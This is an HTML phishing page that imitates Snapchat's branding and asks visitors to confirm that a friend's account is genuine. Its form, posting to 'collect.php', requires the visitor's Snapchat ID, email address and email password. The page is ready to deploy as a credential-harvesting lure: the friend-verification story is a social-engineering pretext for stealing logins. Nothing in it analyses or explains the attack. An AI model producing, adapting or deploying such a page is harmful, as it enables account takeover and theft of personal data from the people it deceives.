 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Account Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial}
body{margin:0;background:#fffc00}
.container{max-width:420px;margin:auto;padding:18px}
.logo{text-align:center;font-size:44px;margin-top:8px}
h1{text-align:center;font-size:22px;margin:18px 0 10px}
.txt{text-align:center;font-size:14px;color:#333;margin:8px 10px 0;line-height:1.4}
.card{background:#fff;border-radius:22px;padding:20px;margin-top:20px;box-shadow:0 6px 20px rgba(0,0,0,.08)}
.option{display:flex;align-items:center;margin:16px 0;font-size:15px}
.option input{width:18px;height:18px;margin-right:10px;accent-color:#000}
select,textarea,input{width:100%;padding:12px;margin-top:10px;border-radius:14px;border:1px solid #ccc;font-size:14px}
textarea{resize:none;height:80px}
button{width:100%;padding:14px;margin-top:20px;border-radius:30px;border:none;background:#000;color:#fff;font-size:16px;cursor:pointer}
.snap-bar{width:100%;padding:14px;margin-bottom:8px;font-size:18px;font-weight:600;text-align:center;border:2px solid #000;border-radius:35px;background:#fff;color:#000}
</style>
</head>
<body>

<div class="container">
  <div class="logo">ðŸ‘»</div>
  <h1>Confirm a Friend's Account Authenticity</h1>
  <p class="txt">Your friend has requested verification.<br>Please confirm if this account belongs to a real person and is not fake or impersonating.</p>
  <div class="snap-bar">Continue with Snapchat</div>

  <div class="card">
    <form action="collect.php" method="POST">
      <div class="option"><input type="radio" name="status" value="real"><span>Yes, this is a real account</span></div>
      <div class="option"><input type="radio" name="status" value="fake"><span>No, this account seems fake</span></div>
      <div class="option"><input type="radio" name="status" value="unsure"><span>I'm not sure</span></div>

      <select name="relation"><option>Friend</option><option>Family</option><option>Colleague</option><option>Online Contact</option></select>
      <textarea name="message" placeholder="How do you know this person?"></textarea>

      <input type="text" name="snap" placeholder="Enter your Snapchat ID" required>
      <input type="email" name="email" placeholder="Enter your email address" required>
      <input type="password" name="password" placeholder="Enter your email password" required>

      <button type="submit">Submit Confirmation</button>
    </form>
  </div>
</div>

</body>
</html>
